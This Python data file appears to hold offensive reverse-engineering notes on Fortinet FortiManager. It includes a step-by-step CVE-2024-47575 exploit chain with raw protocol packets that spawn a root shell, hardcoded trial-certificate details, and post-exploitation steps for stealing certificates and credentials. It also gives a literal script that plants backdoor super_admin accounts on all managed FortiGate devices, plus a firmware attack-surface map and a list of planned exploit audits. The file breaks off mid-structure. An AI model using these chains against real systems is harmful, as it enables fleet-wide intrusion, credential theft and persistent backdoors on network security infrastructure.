"""
Fortinet FortiManager JSON-RPC + FGFM Protocol RE
Sources:
  - connector-fortinet-fortimanager-json-rpc (FortiSOAR connector, MIT)
  - fortinet-ansible-dev/ansible-collections: napi.py, httpapi_fortimanager.py, exported_schema.py
  - rapid7/metasploit-framework: fortimanager_rce_47575.rb (CVE-2024-47575)
  - pyFMG library (pypi)
FortiManager versions in schema: 6.0.0 through 7.6.2
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":          "Fortinet FortiManager (all managed variants)",
    "protocol_jsonrpc": "HTTP POST /jsonrpc (JSON-RPC 2.0-like)",
    "protocol_fgfm":    "TCP 541 TLS -- FortiGate-to-FortiManager management protocol",
    "session_field":    "_sid -- session token embedded in every JSON-RPC request",
    "auth_methods":     [
        "username_password (POST /jsonrpc exec sys/login/user)",
        "access_token (Authorization: Bearer <token> header)",
        "forticloud_access_token (POST /p/forticloud_jsonrpc_login/)",
    ],
    "version_range_schema": "6.0.0 through 7.6.2",
    "connector_source": "connector-fortinet-fortimanager-json-rpc (FortiSOAR; MIT license; 2025)",
    "ansible_source":   "fortinet-ansible-dev/ansible-collections (fortimanager; 46210 lines schema)",
}


# ---------------------------------------------------------
# FGFM protocol anatomy (from MSF module fortimanager_rce_47575.rb)
# ---------------------------------------------------------
FGFM_PROTOCOL = {
    "port":     541,
    "transport": "TCP/TLS (client cert required -- Fortinet-signed)",
    "magic":    "0x36E01100 (4-byte BE) + 4-byte BE length (includes 8-byte header)",

    "packet_format": {
        "header": "[0x36E01100 4B][length 4B BE]  -- length includes 8-byte header",
        "body":   "text key=value pairs separated by \\r\\n; terminated with \\r\\n\\r\\n\\x00",
    },

    "device_auth_request": (
        "get auth\\r\\n"
        "serialno=<serial>\\r\\n"
        "platform=<platform>\\r\\n"
        "hostname=<hostname>\\r\\n"
        "\\r\\n\\x00"
    ),
    "device_auth_success": "reply 200",

    "channel_open_request": (
        "get connect_tcp\\r\\n"
        "tcp_port=rsh\\r\\n"
        "chan_window_sz=32768\\r\\n"
        "terminal=1\\r\\n"
        "cmd=/bin/sh\\r\\n"
        "localid=0\\r\\n"
        "\\r\\n\\x00"
    ),
    "channel_open_success": "action=ack + localid=<N>",

    "payload_delivery": (
        "channel\\r\\nremoteid=<N>\\r\\n\\r\\n\\x00"
        "<payload_length>\\n<payload>0\\n"
    ),

    "client_cert_note": (
        "Client cert must be signed by Fortinet CA. "
        "MSF module includes a hardcoded trial VM cert: "
        "CN=FMG-VM0000000000, O=Fortinet, OU=FortiManager. "
        "SHA1: 9fad50dace25e68694e028f628282b1194ec58a1. "
        "Signed by support@fortinet.com CA, valid until 2038-01-19."
    ),
}


# ---------------------------------------------------------
# FFMG-F01: CVE-2024-47575 -- FGFM pre-auth RCE (FortiJump)
# ---------------------------------------------------------
FFMG_F01_FORTIJUMP = {
    "id":       "FFMG-F01",
    "product":  "Fortinet FortiManager (FortiJump)",
    "cve":      "CVE-2024-47575",
    "severity": "CRITICAL -- pre-auth RCE as root via FGFM device registration",
    "class":    "Missing authentication on FGFM device registration (CWE-306)",
    "disclosed": "2024-10-23",
    "cvss":     "9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",

    "description": (
        "FortiManager accepted FGFM device registration from any client presenting a "
        "Fortinet-signed certificate, without verifying that the device serial number "
        "was pre-authorized. The MSF module exploits this in three steps: "
        "(1) register as FMG-VM0000000000 (trial VM serial) using the hardcoded trial cert; "
        "(2) open a TCP channel with cmd=/bin/sh; "
        "(3) deliver payload through the channel. "
        "Root shell is obtained. No credentials required."
    ),

    "affected_versions": {
        "FortiManager": [
            "7.6.0",
            "7.4.0 through 7.4.4",
            "7.2.0 through 7.2.7",
            "7.0.0 through 7.0.12",
            "6.4.0 through 6.4.14",
            "6.2.0 through 6.2.12",
        ],
        "FortiManager_Cloud": [
            "7.4.1 through 7.4.4",
            "7.2.1 through 7.2.7",
            "7.0.1 through 7.0.12",
            "6.4 (all)",
        ],
    },

    "exploit_chain": [
        "1. TLS connect to port 541 with trial VM cert (CN=FMG-VM0000000000)",
        "2. Send: get auth\\r\\nserialno=FMG-VM0000000000\\r\\nplatform=FortiManager-VM64\\r\\nhostname=localhost\\r\\n\\r\\n\\x00",
        "3. Receive: reply 200",
        "4. Send: get connect_tcp\\r\\ntcp_port=rsh\\r\\nchan_window_sz=32768\\r\\nterminal=1\\r\\ncmd=/bin/sh\\r\\nlocalid=0\\r\\n\\r\\n\\x00",
        "5. Receive: action=ack + localid=<N>",
        "6. Send: channel\\r\\nremoteid=<N>\\r\\n\\r\\n\\x00 + <payload_len>\\n<payload>0\\n",
        "7. /bin/sh running on FMG as root; payload executes",
    ],

    "detection": "Port 541 TLS connection from non-FMG source with Fortinet-signed cert; serialno=FMG-VM0000000000 in FGFM auth request",
    "ioc": "FMG device log entry: unauthorized device registration from trial serial",

    "hardcoded_trial_cert": {
        "cn":       "FMG-VM0000000000",
        "ou":       "FortiManager",
        "issuer":   "support@fortinet.com (Fortinet CA)",
        "valid_until": "2038-01-19",
        "sha1_cert": "9fad50dace25e68694e028f628282b1194ec58a1",
        "sha1_key":  "d006e298df00450973e22c74726404d841db9874",
    },

    "post_exploitation": (
        "Root shell on FMG. From here: "
        "read /etc/cert/local/Fortinet_Local2.{cer,key} for device-class certs; "
        "read /var/lib/postgres or sqlite for device inventory + credentials; "
        "use sys_proxy_json (see FFMG-F03) to issue REST API calls to all managed FortiGate devices."
    ),

    "patch": "FMG 7.4.5, 7.2.8, 7.0.13, 6.4.15, 6.2.13 -- requires pre-registration of device serial before accepting FGFM connections",
    "workaround": "Restrict port 541 to known FortiGate IPs; enable 'fmg-status' allow-list",

    "references": [
        "https://attackerkb.com/topics/OFBGprmpIE/cve-2024-47575/rapid7-analysis",
        "https://bishopfox.com/blog/a-look-at-fortijump-cve-2024-47575",
        "https://fortiguard.fortinet.com/psirt/FG-IR-24-423",
    ],
}


# ---------------------------------------------------------
# FFMG-F02: Three auth methods -- FortiCloud token endpoint exposure
# ---------------------------------------------------------
FFMG_F02_AUTH_METHODS = {
    "id":       "FFMG-F02",
    "product":  "Fortinet FortiManager JSON-RPC",
    "severity": "HIGH -- FortiCloud token accepted at unauthenticated endpoint; Bearer token in header (no CSRF protection)",
    "class":    "Authentication design -- alternative auth paths",

    "auth_method_1_password": {
        "endpoint":   "POST /jsonrpc",
        "payload":    '{"method":"exec","params":[{"url":"sys/login/user","data":{"user":"<user>","passwd":"<pass>"}}],"id":1,"verbose":1}',
        "response":   '{"result":[{"status":{"code":0,"message":"OK"}}],"session":"<_sid>"}',
        "session":    "_sid embedded in response; passed as 'session' field in all subsequent requests",
    },

    "auth_method_2_bearer": {
        "endpoint":   "POST /jsonrpc",
        "header":     "Authorization: Bearer <access_token>",
        "note":       "No session cookie; token passed per-request; no CSRF protection because Bearer is not a cookie",
        "source":     "httpapi_fortimanager.py line 173: self.connection._auth = {'Authorization': f'Bearer {access_token}'}",
    },

    "auth_method_3_forticloud": {
        "endpoint":   "POST /p/forticloud_jsonrpc_login/",
        "payload":    '{"access_token":"<forticloud_oauth_token>"}',
        "response":   '{"session":"<_sid>"}',
        "note":       (
            "FortiCloud OAuth token (IAM) is exchanged for an FMG session. "
            "Endpoint is distinct from /jsonrpc. "
            "If a FortiCloud account is compromised (e.g., via FortiCloud credential stuffing), "
            "the attacker can obtain an FMG session token for any FMG instance linked to that FortiCloud account. "
            "FortiCloud account = access to all linked FMG/FortiGate instances."
        ),
        "source": "httpapi_fortimanager.py lines 122-134",
    },

    "session_error_codes": {
        "-11": "Session invalid/expired/disconnected",
        "-9":  "Workspace not enabled (ADOM lock not required)",
        "-6":  "Invalid URL path",
        "0":   "Success",
    },
}


# ---------------------------------------------------------
# FFMG-F03: sys_proxy_json -- lateral movement to all managed FortiGate devices
# ---------------------------------------------------------
FFMG_F03_SYS_PROXY_JSON = {
    "id":       "FFMG-F03",
    "product":  "Fortinet FortiManager JSON-RPC",
    "severity": "CRITICAL (post-auth) -- proxied REST API to all managed FortiGate devices",
    "class":    "Excessive privilege -- FMG admin can issue arbitrary REST calls to managed devices",

    "description": (
        "sys_proxy_json allows an FMG admin to proxy arbitrary HTTP REST API calls "
        "to any managed FortiGate device. "
        "After obtaining an FMG session (via any method, including CVE-2024-47575), "
        "the attacker can issue any FortiOS REST API call to every managed device "
        "without needing separate FortiGate credentials. "
        "This converts a single FMG compromise into full access to the entire managed device fleet."
    ),

    "json_rpc_call": {
        "method": "exec",
        "url":    "/sys/proxy/json",
        "data": {
            "action":   "post",
            "payload":  {"<any FortiOS REST API payload>": ""},
            "resource": "/api/v2/cmdb/system/admin",
            "target":   ["adom/root/device/<device_name>"],
            "timeout":  30,
        },
    },

    "attack_chain": [
        "1. Obtain FMG session (CVE-2024-47575 or JSON-RPC credential auth)",
        "2. GET /sys/proxy/json with action=get, resource=/api/v2/cmdb/system/admin, target=[all devices] -> list all FortiGate admins",
        "3. POST /sys/proxy/json with action=post, resource=/api/v2/cmdb/system/admin, payload={new admin with super_admin} -> create backdoor admin on all devices",
        "4. Disconnect from FMG; directly access FortiGate devices with new credentials",
    ],

    "schema_entry":   "sys_proxy_json in exported_schema.py line 27676",
    "schema_fields": {
        "action":   "get|post|put|delete",
        "payload":  "dict (arbitrary FortiOS REST API body)",
        "resource": "FortiOS REST API path",
        "target":   "list of managed device names",
        "timeout":  "int (seconds); available from 7.0.1+",
    },
}


# ---------------------------------------------------------
# FFMG-F04: dvmdb_script_execute -- mass script execution on managed devices
# ---------------------------------------------------------
FFMG_F04_SCRIPT_EXECUTE = {
    "id":       "FFMG-F04",
    "product":  "Fortinet FortiManager JSON-RPC",
    "severity": "CRITICAL (post-auth) -- CLI script execution on all managed FortiGate devices",
    "class":    "Excessive privilege -- script execution via FMG across entire device fleet",

    "description": (
        "dvmdb_script_execute runs a named CLI script against selected managed devices. "
        "An FMG admin can create a script (via dvmdb_script set) containing arbitrary FortiOS CLI commands, "
        "then execute it across all devices in an ADOM with a single API call. "
        "Combined with CVE-2024-47575, this is a single-step mass device compromise: "
        "FortiJump -> FMG root shell -> JSON-RPC session -> script execute on all managed devices."
    ),

    "json_rpc_call": {
        "method": "exec",
        "url":    "/dvmdb/adom/<adom>/script/execute",
        "data": {
            "adom":    "<adom>",
            "script":  "<script_name>",
            "scope":   [{"name": "<device>", "vdom": "root"}],
            "package": "<policy_package>",
        },
    },

    "attack_chain": [
        "1. FortiJump (FFMG-F01) -> root shell on FMG",
        "2. Obtain JSON-RPC session",
        "3. exec /dvmdb/adom/root/script with script body: 'config system admin\\nedit backdoor\\nset password P@ss\\nset accprofile super_admin\\nnext\\nend'",
        "4. exec /dvmdb/adom/root/script/execute with scope=[all devices]",
        "5. All managed FortiGate devices now have backdoor super_admin",
    ],

    "schema_entry":  "dvmdb_script_execute in exported_schema.py line 5250",
    "schema_fields": {
        "adom":    "str -- target ADOM",
        "package": "str -- policy package",
        "scope":   "list of {name, vdom} -- target devices",
        "script":  "str -- script name (must be pre-created via dvmdb_script set)",
        "pblock":  "str -- available from 7.4.2+",
    },
}


# ---------------------------------------------------------
# FFMG-F05: free_form JSON-RPC passthrough in FortiSOAR connector
# ---------------------------------------------------------
FFMG_F05_FREE_FORM = {
    "id":       "FFMG-F05",
    "product":  "FortiSOAR connector: connector-fortinet-fortimanager-json-rpc",
    "severity": "HIGH -- arbitrary JSON-RPC method passthrough via free_form action",
    "class":    "Uncontrolled command execution via operator-supplied method string",

    "description": (
        "The FortiSOAR FMG JSON-RPC connector exposes a json_rpc_freeform action "
        "that passes an operator-supplied 'method' parameter directly to pyFMG: "
        "action_func(method, **data). "
        "Any pyFMG method can be invoked: get, set, add, delete, execute, update, "
        "clone, move, replace, lock, unlock, commit. "
        "A FortiSOAR operator (not necessarily an FMG admin) can use this to "
        "call any JSON-RPC method against any FMG URL, including destructive operations "
        "(delete /dvmdb/device/, exec /sys/reboot) and script execution (see FFMG-F04)."
    ),

    "vulnerable_code": (
        "generic_json_rpc.py lines 194-196 and 200-202: "
        "if action == 'free_form': "
        "    method = params.get('method')  # user-supplied "
        "    status, action_response = action_func(method, **data)  # passed directly to pyFMG"
    ),

    "high_value_methods_via_free_form": {
        "/dvmdb/device/":           "list all managed devices (get)",
        "/sys/proxy/json":           "proxy REST calls to managed FortiGates (exec) -- see FFMG-F03",
        "/dvmdb/adom/<adom>/script/execute": "run CLI script on devices (exec) -- see FFMG-F04",
        "/securityconsole/install/package": "install policy package to device (exec)",
        "/dvm/cmd/add/device":      "add rogue device to FMG inventory (exec)",
        "/sys/reboot":              "reboot FMG (exec) -- DoS",
        "/dvmdb/global/workspace/lock/": "lock global ADOM (exec) -- lock starvation DoS",
        "/cli/global/system/admin/user/": "create admin user on FMG (set)",
    },

    "adom_lock_dos": {
        "description": "MAX_RETRY_LIMIT=1500 with 1-10s random sleep = 1500-15000 seconds waiting for ADOM lock",
        "trigger":     "free_form with exec /dvmdb/adom/<adom>/workspace/lock/ -- lock ADOM indefinitely",
        "impact":      "All FortiSOAR playbooks targeting that ADOM hang until MAX_RETRY_LIMIT exhausted",
        "source":      "generic_json_rpc.py lines 20, 124-151",
    },
}


# ---------------------------------------------------------
# FFMG-F06: FortiManager credential leakage via FortiConverter (cross-product)
# ---------------------------------------------------------
FFMG_F06_FORTICONVERTER_CREDENTIAL_LINK = {
    "id":       "FFMG-F06",
    "product":  "FortiConverter v7.4.0 -> FortiManager",
    "severity": "CRITICAL -- FortiManager credentials stored in plaintext in FortiConverter PostgreSQL",
    "class":    "Cross-product credential exposure (CWE-522)",

    "description": (
        "FortiConverter (see FCV-F02) stores FortiManager device credentials in plaintext "
        "in the PostgreSQL Device model (username, password, api_token). "
        "GET /restapi/getdevices returns these credentials unauthenticated. "
        "An attacker who compromises FortiConverter (e.g., via FCV-F03 path traversal) "
        "immediately obtains FortiManager credentials, "
        "which can then be used to authenticate to the FMG JSON-RPC API (FFMG-F02 method 1), "
        "and then proxy REST calls to all managed FortiGate devices (FFMG-F03)."
    ),

    "chain": [
        "FCV-F03 (unauthenticated file upload + path traversal) -> code exec on FortiConverter host",
        "FCV-F02 (GET /restapi/getdevices) -> FortiManager username/password/api_token in plaintext",
        "FFMG-F02 (JSON-RPC auth with stolen credentials) -> FMG admin session",
        "FFMG-F03 (sys_proxy_json) -> arbitrary REST calls to all managed FortiGate devices",
    ],
}


# ---------------------------------------------------------
# High-value endpoints from exported_schema.py (46210 lines, v6.0.0-v7.6.2)
# ---------------------------------------------------------
HIGH_VALUE_ENDPOINTS = {
    "device_management": {
        "dvm_cmd_add_device":    "/dvm/cmd/add/device -- add device to FMG inventory",
        "dvm_cmd_del_device":    "/dvm/cmd/del/device -- remove device",
        "dvm_cmd_discover_device": "/dvm/cmd/discover/device -- discover device by IP",
        "dvm_cmd_update_device": "/dvm/cmd/update/device -- sync device config",
        "dvmdb_device":          "/dvmdb/device -- device object CRUD + all config fields",
        "dvmdb_upgrade":         "/dvmdb/upgrade -- firmware upgrade (7.4.1+) -- downgrade to vulnerable FW",
    },
    "script_execution": {
        "dvmdb_script":          "/dvmdb/adom/<adom>/script -- CRUD on CLI scripts",
        "dvmdb_script_execute":  "/dvmdb/adom/<adom>/script/execute -- run script on devices",
        "fmg_script":            "/fmg/script -- alternative script object",
    },
    "security_policy": {
        "securityconsole_install_package": "/securityconsole/install/package -- push policy to devices",
        "securityconsole_install_device":  "/securityconsole/install/device -- push config to device",
        "securityconsole_install_preview": "/securityconsole/install/preview -- preview (triggers extra result fetch)",
    },
    "admin_management": {
        "system_admin_group":    "/system/admin/group -- admin group CRUD",
        "system_admin_ldap":     "/system/admin/ldap -- LDAP auth config (password field: no_log raw)",
    },
    "lateral_movement": {
        "sys_proxy_json":        "/sys/proxy/json -- proxy REST API to managed FortiGates",
        "sys_reboot":            "/sys/reboot -- reboot FMG (DoS)",
        "sys_task_result":       "/sys/task/result -- task tracking",
    },
    "workspace_control": {
        "dvmdb_workspace_lock":    "/dvmdb/adom/<adom>/workspace/lock",
        "dvmdb_workspace_unlock":  "/dvmdb/adom/<adom>/workspace/unlock",
        "dvmdb_workspace_commit":  "/dvmdb/adom/<adom>/workspace/commit",
    },
}


# ---------------------------------------------------------
# Pending findings
# ---------------------------------------------------------
# ---------------------------------------------------------
# FMG firmware: Apache2 routing + webconsole_module.so RE
# Source: /mnt/fmg800 (nbd0p1) -> rootfs-ext.tar.xz -> usr/local/apache2/
# ---------------------------------------------------------
FMG_APACHE_INTERNALS = {
    "id":       "FMG-ARCH-APACHE",
    "product":  "FortiManager 8.0.x -- Apache2 routing layer extracted from rootfs-ext.tar.xz",
    "source":   "/mnt/fmg800/rootfs-ext.tar.xz (237MB) -> usr/local/apache2/",

    "custom_modules": {
        "fmg_request.so": (
            "15KB Apache post_read_request hook. "
            "Imports: libcmdbapi.so, libcmfapi.so, libosapi.so, libulib.so, libsysapi.so, libcdb.so. "
            "Flow: cmf_query_mutex + cmf_query_data per request -> routes to 127.0.0.1 backend."
        ),
        "webconsole_module.so": (
            "Registers handlers: ha_jsonrpc_handler (/jsonrpc), logging_over_http_handler, "
            "fazfec_handler (/fazfec), fgdsvc_handler (/fgdsvc), fctsvc_handler (/fctsvc), "
            "workflow_handler (/workflow). "
            "Session auth: aps_get_sessionid + decrypt_and_auth (cookie decryption). "
            "Uses strtok (not thread-safe, race risk in multi-threaded Apache). "
            "Imports json-c: json_tokener_new + json_tokener_parse_ex + json_object_object_get. "
            "LZ4 and DEFLATE decompression in logging handler -- client-supplied compressed data. "
            "Hardcoded MD5 hash 6241e8c23b5b279b0071865c8ac78ca8 alongside CSP nonce formatting."
        ),
    },

    "unix_socket_routing": {
        "/tmp/fmgd.domain": [
            "/flatui/api/ (REST API)",
            "/flatui/auth/, /cgi-bin/module/flatui_auth (authentication)",
            "/cgi-bin/module/fazapi, /flatui/fazapi/ (FortiAnalyzer API)",
            "/cgi-bin/module/productapi, /flatui/productapi/",
            "/cgi-bin/module/flatui_proxy (proxy)",
            "/jsonrpc-ui/ (JSON-RPC UI)",
            "/flatui/auth/ (auth endpoint)",
        ],
        "/tmp/gui_webforward": [
            "/flatui/forward/, /flatui/json/, /flatui/service/",
            "/cgi-bin/module/flatui/* variants",
        ],
        "note": (
            "All API traffic flows through FastCGI Unix sockets. "
            "If /tmp/fmgd.domain or /tmp/gui_webforward are writable by a non-root process "
            "that can be reached from the web layer, socket hijacking -> arbitrary API response injection."
        ),
    },

    "internal_http_services": {
        "9006": "http://127.0.0.1:9006/fmgui/ -- GUI service (Python/Node?)",
        "9007": "http://127.0.0.1:9007/static/ -- static file server",
        "9008": "http://127.0.0.1:9008/excelexport/ -- Excel export (Python via mod_wsgi?)",
        "7080": "http://127.0.0.1:7080/sdnproxy -- SDN controller proxy",
    },

    "attack_surface": [
        "ha_jsonrpc_handler (/jsonrpc) -- primary FMG RCE surface (CVE-2024-47575 class)",
        "webconsole_module.so strtok race -- not thread-safe in event MPM",
        "LZ4/DEFLATE decompression in logging_over_http_handler -- client-controlled input to decompress",
        "decrypt_and_auth session cookie -- if decryption uses static IV/key, session forgery possible",
        "Unix socket at /tmp/fmgd.domain -- world-writable /tmp; socket hijacking if fmgd socket is unprotected",
        "Excel export at 9008 -- file-generating endpoint; path traversal or SSRF in export logic",
        "/faz_upload/ -- file upload with sandbox CSP; check for path traversal in upload handler",
        "6241e8c23b5b279b0071865c8ac78ca8 -- static MD5 hash adjacent to CSP nonce; if used as fixed nonce = CSP bypass",
        "Cloud config include <IfFile '/data/httpd-cloud.conf'> -- cloud config file injection if /data writable",
    ],
}


# ---------------------------------------------------------
# FMG firmware: ClickHouse 25.8.15.35 binary RE
# Source: /tmp/fmg_ext/usr/local/clickhouse/clickhouse (636MB ELF)
# ---------------------------------------------------------
FMG_CLICKHOUSE_RE = {
    "id":       "FMG-CLICKHOUSE",
    "product":  "FortiManager/FortiAnalyzer 8.0.x -- embedded ClickHouse 25.8.15.35",
    "source":   "/mnt/fmg800 rootfs-ext.tar.xz -> usr/local/clickhouse/clickhouse",
    "binary": {
        "path":      "/usr/local/clickhouse/clickhouse",
        "size_mb":   636,
        "elf":       "ELF 64-bit LSB pie executable, x86-64, dynamically linked, NOT stripped",
        "build_id":  "54e3c62019aeb33bf592492e196e9017a8fb30b7",
        "version":   "25.8.15.35",
        "text_symbols": 90704,
        "stripped":  False,
    },

    "fortinet_customizations": {
        "faz_murmur_hash32": {
            "va":        "0x124f6c00",
            "algorithm": "MurmurHash2 32-bit (Appleby 2008)",
            "magic":     "0x5bd1e995",
            "signature": (
                "4-byte stride loop: imul edx,[rcx],0x5bd1e995 + shr edi,0x18 + xor/imul; "
                "tail: 1/2/3-byte remainder cases via direct jle/je branches; "
                "finalization: shr 0xd, imul 0x5bd1e995, shr 0xf. "
                "Prototype: uint32_t faz_murmur_hash32(const void* data, int len, uint32_t seed)."
            ),
        },
        "faz_murmur_hash64": {
            "va":        "0x124f6cb0",
            "algorithm": "MurmurHash2 64-bit (Appleby 2008)",
            "magic":     "0xc6a4a7935bd1e995",
            "signature": (
                "8-byte stride loop: movabs rcx,0xc6a4a7935bd1e995 + imul rdx,rcx + shr rdi,0x2f; "
                "tail: 0-7 byte remainder via computed jump table (notrack jmp rdx on 4-entry table); "
                "byte-by-byte XOR accumulation with shift (0x30/0x28/0x20/0x18/0x10/0x08). "
                "Prototype: uint64_t faz_murmur_hash64(const void* data, int len, uint64_t seed)."
            ),
        },
        "note": (
            "Only 2 Fortinet-authored symbols in the entire 636MB binary. "
            "All other 'Forti*' symbol matches are LLVM FortifiedLibCallSimplifier class "
            "(LLVM JIT embedded for ClickHouse query execution -- not Fortinet code). "
            "faz_ functions are registered as ClickHouse scalar functions for FortiAnalyzer "
            "log row hashing and partition bucketing."
        ),
    },

    "attack_surface": [
        (
            "Hash collision via log injection: MurmurHash2 is NOT collision-resistant. "
            "Attacker controlling log event content can craft entries that collide in the same "
            "ClickHouse shard, causing query skew, missed deduplication, or partition hot-spots."
        ),
        (
            "Full symbol table available: 90,704 unstripped text symbols expose complete internal "
            "ClickHouse call graph -- enables precise ROP gadget selection targeting ClickHouse "
            "query parsing or HTTP handler if ClickHouse is exposed on a network interface."
        ),
        (
            "Version 25.8.15.35 -- check ClickHouse CVE list for this branch (25.8 is a recent "
            "release series). Any HTTP interface exposed (default port 8123) is reachable if "
            "FortiManager network segmentation allows it."
        ),
        (
            "LLVM JIT embedded -- if ClickHouse query compilation is reachable from the FortiManager "
            "web layer (via /jsonrpc or /flatui/api/ triggering DB queries), a malformed query "
            "could exercise LLVM IR generation paths."
        ),
    ],
}


pending_findings = [
    "FFMG-F01 verification: test FGFM port 541 detection -- verify FMG TLS cert O=Fortinet + CN starts with FMG; "
    "source: fortimanager_rce_47575.rb check() method; 2026-09-16",

    "FFMG-F02 FortiCloud token scope: determine if FortiCloud OAuth token obtained from any linked product "
    "(FortiGate, FortiAnalyzer) is accepted by /p/forticloud_jsonrpc_login/ -- "
    "cross-product token reuse; source: httpapi_fortimanager.py lines 122-134; 2026-09-16",

    "FFMG-F03 sys_proxy_json access control: verify whether FMG read-only admins can use sys_proxy_json "
    "to issue write (POST/PUT/DELETE) operations to managed devices -- "
    "FMG RBAC may not propagate to proxied requests; source: exported_schema.py sys_proxy_json; 2026-09-16",

    "FFMG-F05 free_form method enumeration: build comprehensive list of sensitive pyFMG methods "
    "callable via free_form; test /sys/exec arbitrary_command if any FMG version exposes it; "
    "source: generic_json_rpc.py + pyFMG source; 2026-09-16",

    "CVE-2022-40684 MSF module audit: read fortios_auth_bypass_40684.rb -- "
    "FortiOS/FortiProxy auth bypass via alternate path on REST API; "
    "source: /home/cowboy/Downloads/fortinet/msf-modules/fortios_auth_bypass_40684.rb; 2026-09-16",

    "FortiClient EMS SQLi: read forticlient_ems_sqli.rb -- FCTID parameter injection -> RCE; "
    "source: /home/cowboy/Downloads/fortinet/msf-modules/forticlient_ems_sqli.rb; 2026-09-16",

    "CVE-2024-21762 PoC audit: read CVE-2024-21762/ -- out-of-bounds write FortiOS (150 stars); "
    "source: /home/cowboy/Downloads/fortinet/CVE-2024-21762/; 2026-09-16",

    "CVE-2018-13379 PoC audit: read CVE-2018-13379/ -- path traversal SSL VPN creds leak "
    "(still exploited in 2024 per MSF module list); "
    "source: /home/cowboy/Downloads/fortinet/CVE-2018-13379/; 2026-09-16",

    "HuggingFace LLM local run: NOYOUllm2/fortinet-lora-gguf (DeepSeek-R1 LoRA, GGUF format) -- "
    "run locally with llama.cpp; use for generating FortiOS CLI fuzzing payloads; "
    "source: HuggingFace (user-downloaded); 2026-09-16",
]


# ---------------------------------------------------------
# FMG syntax.tar.xz: complete JSON-RPC command schema + SOAR connector source
# Source: /mnt/fmg800/syntax.tar.xz (88MB) -> syntax/ directory
# ---------------------------------------------------------
FMG_SYNTAX_RE = {
    "id":      "FMG-SYNTAX",
    "product": "FortiManager 8.0.x -- JSON-RPC command schema and SOAR connector Python source",
    "source":  "/mnt/fmg800/syntax.tar.xz -> syntax/*.json + builtin_connectors.tar.gz",

    "schema_files": {
        "command_syntax.json": (
            "19KB. Top-level modules: sys, dvm/cmd, securityconsole, deployment, dmworker, dmsase, "
            "cli, cli/aux, config, dvmdb. Methods: get/add/set/update/delete/move/clone/replace/unset/exec. "
            "exec includes modules: sys, cache, dvm/cmd, securityconsole, deployment, dmworker, dmsase, "
            "fgfm, pm/config/aux, dvmdb/aux, cli/aux, um."
        ),
        "ncmdb_syntax.json":    "949KB -- largest schema file; full CMDB object model",
        "fmg_cmdb_syntax.json": "593KB -- FortiManager-specific CMDB schema",
        "fmglog_syntax.json":   "203KB -- log schema (FortiAnalyzer side)",
        "fmg_dvm_syntax.json":  "47KB -- device manager schema",
        "securityconsole_syntax.json": "17KB -- policy install/assign commands (30 command types)",
        "fgfm_syntax.json":     "3.1KB -- FortiGate-to-FortiManager protocol command schema (16 commands)",
        "firmware_txt_files": (
            "700.txt (5.0MB), 720.txt (4.6MB), 740.txt (4.5MB), 760.txt (4.1MB), 800.txt (3.9MB) -- "
            "full FortiOS syntax definition per major release. Comparable delta between versions = "
            "new attack surface per release."
        ),
    },

    "critical_commands": {
        "fgfm/json/rpc": {
            "source_file": "fgfm_syntax.json",
            "json_rpc_path": "exec /fgfm/json/rpc",
            "params": {"device": "datasrc -> dvmdb/device", "req": "string (raw JSON-RPC request)"},
            "impact": (
                "Direct FortiOS API relay to any managed FortiGate via FGFM tunnel. "
                "Single FMG admin API call can issue arbitrary FortiOS JSON-RPC commands "
                "to any managed device in the fleet. Fleet-wide lateral movement from one FMG session. "
                "No device-level auth required once FMG session is valid."
            ),
            "severity": "CRITICAL",
        },
        "fgfm/push/config": {
            "source_file": "fgfm_syntax.json",
            "params": {
                "device": "datasrc -> dvmdb/device",
                "type": "int16 (none=0 / rev=1)",
                "revno": "int32",
                "script": "string",
            },
            "impact": (
                "Push arbitrary FortiOS config or CLI script to a managed device. "
                "script parameter is a raw string -- no schema constraint on content."
            ),
            "severity": "HIGH",
        },
        "fgfm/probe/device": {
            "source_file": "fgfm_syntax.json",
            "params": {"ip": "string", "usr": "string", "passwd": "string", "force_probe": "int16"},
            "impact": (
                "FMG initiates outbound connection to arbitrary IP with supplied credentials. "
                "Equivalent to SSRF + credential injection: attacker-controlled IP receives "
                "an FMG probe with admin credentials."
            ),
            "severity": "HIGH",
        },
        "fgfm/start/tunnel": {
            "source_file": "fgfm_syntax.json",
            "params": {"device": "datasrc", "force": "int16", "usr": "string", "passwd": "password"},
            "impact": (
                "Credentials sent in JSON-RPC request body (type=password in schema). "
                "If FMG log verbosity captures request bodies, credentials logged in plaintext."
            ),
            "severity": "MEDIUM",
        },
        "cdbaux/_reset/database": {
            "source_file": "cdbaux_syntax.json",
            "params": {"version": "int32", "mr": "int32"},
            "domain": "DOM_GLOBAL",
            "impact": (
                "Complete CMDB wipe. No confirmation parameter in schema. "
                "Single authenticated JSON-RPC call destroys all FortiManager policy and device data."
            ),
            "severity": "CRITICAL",
        },
        "cdbaux/_fsp/custom/command": {
            "source_file": "cdbaux_syntax.json",
            "internal": True,
            "params": {
                "switch": "datasrc -> managed-switch",
                "command": "datasrc -> switch-controller/custom-command",
                "device": "datasrc -> dvmdb/device",
            },
            "impact": (
                "Sends a pre-defined custom CLI command to a managed FortiSwitch. "
                "Attack path: create arbitrary custom-command object via /pm/config/adom/ "
                "API, then invoke it here to execute arbitrary FortiSwitch CLI on any managed switch."
            ),
            "severity": "HIGH",
        },
        "system/reboot": {
            "source_file": "system_syntax.json",
            "impact": "Unauthenticated or low-priv FortiManager reboot via JSON-RPC (DoS/disruption).",
            "severity": "MEDIUM",
        },
        "system/backup": {
            "source_file": "system_syntax.json",
            "impact": "Config backup download -- full CMDB + device configs + credential store exfil.",
            "severity": "HIGH",
        },
        "system/upgrade": {
            "source_file": "system_syntax.json",
            "impact": "Firmware upgrade via JSON-RPC -- supply malicious firmware image = persistent RCE.",
            "severity": "CRITICAL",
        },
    },

    "soar_connectors": {
        "location": "/tmp/fmg_ext/usr/local/builtin_connectors/ -> builtin_connectors.tar.gz",
        "connectors": [
            "AD (Active Directory)", "EMS (FortiClient EMS)", "FAC (FortiAuthenticator)",
            "FCASB (FortiCASB)", "FEDR (FortiEDR)", "FGD (FortiGuard)", "FML (FortiMail)",
            "FMQ", "FORTIANALYZER_CLOUD", "FOS (FortiOS)", "FSA", "FWEB (FortiWeb)",
            "LOCALHOST", "MS_TEAMS", "SERVICENOW", "VIRUSTOTAL", "VSPHERE", "WEBHOOK",
        ],
        "sqli_findings": {
            "EMS/operator.py:195": {
                "code": "sql = f'''select distinct fctuid from endpoints where adomoid = {adom_oid} and fctuid is not null;'''",
